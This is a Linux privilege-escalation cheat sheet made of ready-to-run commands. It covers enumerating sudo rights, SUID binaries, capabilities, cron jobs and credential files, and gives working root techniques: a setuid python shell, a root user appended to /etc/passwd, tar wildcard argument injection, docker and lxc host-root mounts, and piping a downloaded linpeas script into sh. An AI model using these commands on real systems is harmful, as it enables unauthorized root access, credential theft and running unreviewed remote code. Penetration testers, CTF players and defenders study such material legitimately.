# Linux Privilege Escalation

## Quick enumeration
```bash
# Identity & context
id; whoami; hostname; uname -a; cat /etc/*release*

# Sudo rights (most common privesc vector)
sudo -l

# SUID/SGID binaries (cross-reference with GTFOBins)
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null

# Capabilities (cap_setuid+ep = instant root)
getcap -r / 2>/dev/null

# Cron jobs
cat /etc/crontab; ls -la /etc/cron.*; crontab -l 2>/dev/null
# Writable cron scripts:
find /etc/cron* /var/spool/cron -writable 2>/dev/null

# Writable paths & PATH hijack
find / -writable -type d 2>/dev/null | head -20
echo $PATH | tr ':' '\n'

# Kernel version (check exploitdb)
uname -r; cat /proc/version

# Interesting files
find / \( -name "*.conf" -o -name "*.bak" -o -name "*.old" -o -name ".env" \
  -o -name "id_rsa" -o -name "authorized_keys" -o -name "shadow" \
  -o -name "*.kdbx" -o -name "wp-config.php" \) 2>/dev/null | head -30

# Running services (look for root-owned services you can interact with)
ss -tlnp; ps aux | grep -E '^root'

# Internal ports not exposed externally
ss -tlnp | grep '127.0.0.1'
```

## Common privesc vectors

### Sudo
- `sudo -l` shows `(ALL) NOPASSWD:` on a binary -> check GTFOBins.
- `sudo -l` shows env_keep+=LD_PRELOAD -> compile shared lib that spawns shell.
- `sudo <version>` < 1.9.5p2 -> CVE-2021-3156 (Baron Samedit).

### SUID binaries
Cross-reference every SUID binary with https://gtfobins.github.io/.
Custom/unusual SUID binaries are higher priority than system ones.

### Capabilities
- `cap_setuid+ep` on any binary -> `python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'`
- `cap_dac_read_search` -> read any file (shadow, SSH keys)
- `cap_net_raw` -> packet capture (credential sniffing)

### Writable /etc/passwd
```bash
# If /etc/passwd is writable:
openssl passwd -1 -salt evil password123
echo 'evil:<hash>:0:0:root:/root:/bin/bash' >> /etc/passwd
su evil
```

### Cron jobs
- World-writable script called by root cron -> inject reverse shell.
- Wildcard injection: if cron runs `tar czf backup.tar.gz *` in a
  writable dir, create files named `--checkpoint=1` and
  `--checkpoint-action=exec=shell.sh`.

### Docker/LXC group membership
```bash
# If user is in docker group:
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# If user is in lxc/lxd group:
lxc init ubuntu:18.04 privesc -c security.privileged=true
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
lxc start privesc && lxc exec privesc /bin/sh
```

### NFS no_root_squash
```bash
showmount -e <target>
# If no_root_squash: mount, create SUID binary as root, execute on target
```

## Automated tools (if available in container)
```bash
# LinPEAS
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
# Linux Smart Enumeration
./lse.sh -l 1
# LinEnum
./LinEnum.sh -t
```
